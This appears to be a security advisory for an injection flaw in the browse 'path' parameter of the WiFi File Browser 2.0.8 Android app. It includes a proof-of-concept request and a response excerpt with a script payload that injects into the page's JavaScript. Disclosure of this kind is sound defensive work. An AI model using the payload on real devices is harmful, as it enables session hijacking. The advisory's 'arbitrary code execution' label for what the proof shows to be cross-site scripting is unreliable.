===============================
WiFi File Browser allows you to download and upload files to your mobile device by using your favourite web browser
without the need of a USB cable. The application main focus is to deliver high speed file transfer to users. Many user
reviews state that this is the fastest WiFi file transfer application

(Copy of the Vendor Homepage: https://play.google.com/store/apps/details?id=pt.webprods.android.file.manager.pro )

Affected Product(s):
====================
ByteLounge
Product: WiFi File Browser - (Android) Web Application 2.0.8

Technical Details & Description:
================================
An arbitrary code execution vulnerability has been discovered in the official Wifi File Browser Pro v2.0.8 (Android)
mobile application.
The vulnerability allows remote attackers to execute malicious codes on the application-side of the vulnerable browser
app to compromise
the target mobile device.

The vulnerability is located in the `path` value of the `browse` module. Remote attackers are able to manipulate the
path value in the
browse GET method request to compromise the application, user session information or connected device components. The
vector of the issue
is located on the application-side. Successful exploitation requires a client-side GET method request.

The security risk of the arbitrary code execution vulnerability is estimated as high with a cvss (common vulnerability
scoring system) count of 7.1.
Exploitation of the arbitrary code execution vulnerability requires no user interaction or privileged web-application
user account with password.
Successful exploitation of the vulnerability results in session hijacking, persistent phishing, persistent external
redirects and persistent
manipulation function or connected module context.

Request Method(s):
[+] [GET]

Vulnerable Module(s):
[+] browse

Vulnerable Parameter(s):
[+] path

Affected Module(s):
[+] Index of Documents (http://localhost:8080)


Proof of Concept (PoC):
=======================
The arbitrary code execution vulnerability can be exploited by remote attackers without user interaction or privileged
application user account.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to
continue.


--- PoC Session Logs [GET] (Execution) ---
GET /browse?path=/_[ARBITRARY CODE EXECUTION VULNERABILITY!]&sfield=d&sorder=d HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive


PoC: Wifi Browser
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; " />
<title>WiFi File Browser</title>
<link rel="stylesheet" type="text/css" media="screen" href="/style3.css"
/>
<script type="text/javascript" language="javascript">
var currentPath = &#039;%2F_%3C%2Fscript%3E%3Cscript%3Eprompt%28document.cookies%29%3C%2Fscript%3E[CS XSS]&#039;;
var currentPathNotEnc = &#039;/_[ARBITRARY CODE EXECUTION VULNERABILITY!]&#039;;
var curSortOrder = &#039;d&#039;;
var curSortMethod = &#039;d&#039;;
var curThumbs = &#039;&#039;;
</script>


Reference:
http://localhost:8880/


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure restriction of the path value in the browse GET method request.
requests.

